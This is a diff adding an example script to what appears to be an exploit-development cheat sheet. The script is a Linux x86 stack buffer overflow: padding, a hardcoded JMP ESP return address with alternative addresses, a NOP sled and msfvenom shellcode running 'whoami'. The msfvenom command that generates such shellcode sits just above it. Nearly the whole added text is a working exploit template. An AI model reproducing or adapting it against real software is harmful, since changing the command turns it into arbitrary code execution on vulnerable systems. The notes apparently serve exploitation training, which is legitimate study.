@@ -241,7 +241,32 @@ OR
 GENERATE SHELLCODE
 msfvenom -p linux/x86/exec CMD="<cmd>" -b '\x00' -f python  #Generates shellcode to put into mybuff.py
                                                             #MAY FAIL, Regenerate
+Example Script:
+#!/usr/bin/python
 
+buffer = "A" * 62
+eip = "\x59\x3b\xde\xf7" #JMP ESP
+
+'''
+0xf7de3b59 
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+'''
+
+nop = "\x90" * 10
+
+buf =  b""
+buf += b"\xdb\xc0\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\x46\x24"
+buf += b"\x0e\x36\xb1\x0b\x31\x58\x19\x83\xc0\x04\x03\x58"
+buf += b"\x15\xa4\xd1\x64\x3d\x70\x83\x2b\x27\xe8\x9e\xa8"
+buf += b"\x2e\x0f\x88\x01\x42\xa7\x49\x36\x8b\x55\x23\xa8"
+buf += b"\x5a\x7a\xe1\xdc\x5a\x7c\x06\x1d\x12\x14\x69\x7c"
+buf += b"\xb1\x8d\x75\x29\x1a\xc4\x97\x18\x1c"
+#msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+
+print(buffer+eip+nop+buf)
 ---------------
 Windows Exploit Development
 
